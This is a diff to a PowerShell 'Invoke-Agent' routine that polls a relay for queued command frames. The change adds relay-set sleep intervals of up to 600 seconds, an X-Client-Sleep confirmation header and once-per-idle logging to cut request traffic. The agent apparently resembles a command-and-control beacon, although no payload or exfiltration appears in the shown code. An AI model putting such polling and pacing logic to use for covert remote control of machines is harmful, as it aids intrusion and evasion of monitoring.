@@ -92,6 +92,11 @@ function Invoke-Agent {
         foreach ($h in $script:identityHeaders) {
             try { $req.Headers.Add($h[0], $h[1]) } catch {}
         }
+        # Confirm the applied sleep so the relay extends sweep patience for THIS agent
+        # only (hint-blind agents keep the base offline timers).
+        if ($script:localSleepSec -gt 0) {
+            try { $req.Headers.Add('X-Client-Sleep', [string]$script:localSleepSec) } catch {}
+        }
         return $req
     }
     function B64Stream($base64) {
@@ -267,6 +272,11 @@ function Invoke-Agent {
     $script:inShip = $false
     $script:identityHeaders = $null
     $script:clrVersion = 'v4.0.30319'
+    # Deep-idle pacing state: the sleep the relay last hinted (X-Sleep-Hint, seconds
+    # 0-600) and whether the idle transition was already logged (one log ship per idle
+    # ENTRY — a ship EVERY idle cycle doubled the idle request cost).
+    $script:localSleepSec = 0
+    $script:idleLogged = $false
     # TLS 1.2 by int-cast (relays sit on modern TLS stacks; on .NET 3.5 the Tls12 enum
     # member doesn't exist, and a numeric assignment sidesteps the failed enum parse).
     # Process-wide ServicePointManager state — set before the first request, guarded so a
@@ -293,10 +303,24 @@ function Invoke-Agent {
         } catch {
             return 'fail'
         }
+        # Deep-idle hint (X-Sleep-Hint, seconds): how long to wait LOCALLY before the
+        # next POST after an empty answer. Old relays omit it (→ 0 = immediate
+        # re-POST); clamped so a bad header can never park the agent. Read BEFORE the
+        # response stream closes.
+        try { $script:localSleepSec = [Math]::Max(0, [Math]::Min(600, [int][string]$resp.Headers['X-Sleep-Hint'])) } catch { $script:localSleepSec = 0 }
         try { $answer = ReadAllBytes $resp.GetResponseStream() } catch { $answer = New-Object byte[] 0 } finally { $resp.Close() }
         $pending = @()
-        # Empty answer = nothing queued — re-POST immediately.
-        if ($answer.Length -eq 0) { Log 'idle - empty answer'; continue }
+        # Empty answer = nothing queued — re-POST after the hint. The idle log ships
+        # once per idle ENTRY: each Log is its own X-Log-Only POST, and one EVERY
+        # cycle doubled the idle request cost.
+        if ($answer.Length -eq 0) {
+            if (-not $script:idleLogged) { Log 'idle - empty answer'; $script:idleLogged = $true }
+            # Deep-idle pacing: wait the hint out locally — the durable pool keeps
+            # commands queued; the cost is only pickup latency while deep-idle.
+            if ($script:localSleepSec -gt 0) { Start-Sleep -Seconds $script:localSleepSec }
+            continue
+        }
+        $script:idleLogged = $false
         $frames = ParseFrames $answer
         foreach ($f in $frames) {
             if ($script:exiting) { break }
